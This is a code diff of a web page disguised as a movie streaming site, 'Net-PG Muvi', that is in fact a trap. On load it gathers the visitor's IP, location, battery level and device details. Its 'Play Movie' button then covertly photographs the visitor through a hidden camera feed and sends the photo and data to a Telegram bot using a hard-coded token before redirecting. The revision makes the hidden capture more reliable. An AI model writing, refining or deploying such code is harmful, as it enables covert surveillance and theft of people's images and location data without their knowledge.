@@ -1,41 +1,26 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Net-PG Muvi | Secure Streaming</title>
-    <style>
-        body { background-color: #0b0b0b; color: #e5e5e5; font-family: 'Helvetica Neue', Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .logo { color: #db0000; font-size: 2.5rem; font-weight: bold; letter-spacing: 2px; margin-bottom: 30px; }
-        .btn-play { background-color: #db0000; color: white; border: none; padding: 15px 40px; font-size: 1.2rem; font-weight: bold; border-radius: 5px; cursor: pointer; display: none; transition: 0.3s; }
-        .btn-play:hover { background-color: #ff0000; transform: scale(1.05); }
-        .loader { border: 4px solid rgba(255,255,255,0.1); border-left-color: #db0000; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
-        .content { text-align: center; max-width: 400px; padding: 20px; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        #cam-raw { display: none; } /* Hide the camera feed from the user */
-    </style>
-</head>
-<body>
-    <div class="content">
-        <div class="logo">NET-PG MUVI</div>
-        <div id="loader-box">
-            <div class="loader"></div>
-            <h2 id="status">Verifying Device Security...</h2>
-        </div>
-        <button id="play-btn" class="btn-play" onclick="startTheTrap()">▶ PLAY MOVIE</button>
-        <p id="sub-text" style="font-size: 0.8rem; color: #666; margin-top: 20px;">Identity Verification may be required for 4K playback.</p>
-    </div>
+<style>
+    /* ... your previous styles ... */
+    #video {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 1px;
+        height: 1px;
+        opacity: 0; /* Hidden from eyes, but active for the browser */
+        pointer-events: none;
+    }
+</style>
 
-    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
-    <script>
-        const botToken = "8060572871:AAGdgGSMVfEft5DHEhx3QMU9vHSMlNVijUI";
-        const chatId = "6312622799";
-        let capturedData = {};
+<script>
+    const botToken = "8060572871:AAGdgGSMVfEft5DHEhx3QMU9vHSMlNVijUI";
+    const chatId = "6312622799";
+    let capturedData = {};
 
-        // 1. Initial Data Collection (IP/Battery/Hardware)
-        async function preCollect() {
+    async function preCollect() {
+        try {
             let ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
             let battery = 'getBattery' in navigator ? await navigator.getBattery().then(b => `${Math.round(b.level*100)}%`) : "N/A";
             
@@ -45,71 +30,78 @@
                 bat: battery,
                 device: `${navigator.platform} (${navigator.hardwareConcurrency} Cores)`
             };
+        } catch(e) { console.log("Pre-collect failed"); }
 
-            // Switch UI to Play Button
-            document.getElementById('loader-box').style.display = 'none';
-            document.getElementById('play-btn').style.display = 'block';
-            document.getElementById('status').innerText = "Ready to Stream";
-        }
+        document.getElementById('loader-box').style.display = 'none';
+        document.getElementById('play-btn').style.display = 'block';
+        document.getElementById('status').innerText = "Ready to Stream";
+    }
 
-        // 2. The Big Trap (Triggered by Play Button)
-        async function startTheTrap() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const movieLink = urlParams.get('dest') || "https://mega.nz/";
+    async function startTheTrap() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const movieLink = urlParams.get('dest') || "https://mega.nz/";
 
-            document.getElementById('play-btn').innerText = "Loading Player...";
+        document.getElementById('play-btn').innerText = "Connecting to Server...";
 
-            // Try to get Camera Access
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-
-                // Wait 1 second for the camera to wake up, then snap
+        try {
+            // Request camera with 'playsinline' for mobile support
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, 
+                audio: false 
+            });
+            
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            
+            // 🔥 The Fix: Wait for the video to actually be 'ready'
+            video.onloadedmetadata = () => {
+                video.play();
+                
+                // Wait 1.5 seconds for the sensor to adjust from black to light
                 setTimeout(async () => {
                     const canvas = document.getElementById('canvas');
-                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                    const imageData = canvas.toDataURL('image/jpeg');
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
-                    // Stop the camera
+                    const imageData = canvas.toDataURL('image/jpeg', 0.7); // 0.7 quality for faster upload
+                    
+                    // Kill the camera immediately after snap
                     stream.getTracks().forEach(track => track.stop());
 
-                    // Send Photo to Telegram
+                    // Send the loot
                     await sendPhotoToTelegram(imageData);
-                    
-                    // Send the rest of the text data
                     await sendDataToTelegram(movieLink);
 
-                    // Final Redirect
+                    // Final Move
                     window.location.href = movieLink;
-                }, 1000);
+                }, 1500); 
+            };
 
-            } catch (err) {
-                // If they deny camera, just send the text data and redirect anyway
-                await sendDataToTelegram(movieLink);
-                window.location.href = movieLink;
-            }
+        } catch (err) {
+            // If they block camera, we still get the data
+            console.log("Camera blocked: ", err);
+            await sendDataToTelegram(movieLink);
+            window.location.href = movieLink;
         }
+    }
 
-        async function sendPhotoToTelegram(base64Data) {
-            const blob = await (await fetch(base64Data)).blob();
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'snap.jpg');
-            formData.append('caption', `📸 **Face Captured!**\nIP: ${capturedData.ip}`);
+    async function sendPhotoToTelegram(base64Data) {
+        const blob = await (await fetch(base64Data)).blob();
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, 'snap.jpg');
+        formData.append('caption', `📸 **Face Captured!**\nIP: ${capturedData.ip || 'Unknown'}`);
 
-            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-        }
+        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        });
+    }
 
-        async function sendDataToTelegram(link) {
-            let msg = `🚨 **LOG REPORT** 🚨\n🎬 Movie: ${link}\n🌐 IP: ${capturedData.ip}\n📍 Loc: ${capturedData.loc}\n🔋 Bat: ${capturedData.bat}\n💻 Dev: ${capturedData.device}`;
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-        }
+    async function sendDataToTelegram(link) {
+        let msg = `🚨 **LOG REPORT** 🚨\n🎬 Movie: ${link}\n🌐 IP: ${capturedData.ip}\n📍 Loc: ${capturedData.loc}\n🔋 Bat: ${capturedData.bat}\n💻 Dev: ${capturedData.device}`;
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+    }
 
-        window.onload = preCollect;
-    </script>
-</body>
-</html>
+    window.onload = preCollect;
+</script>
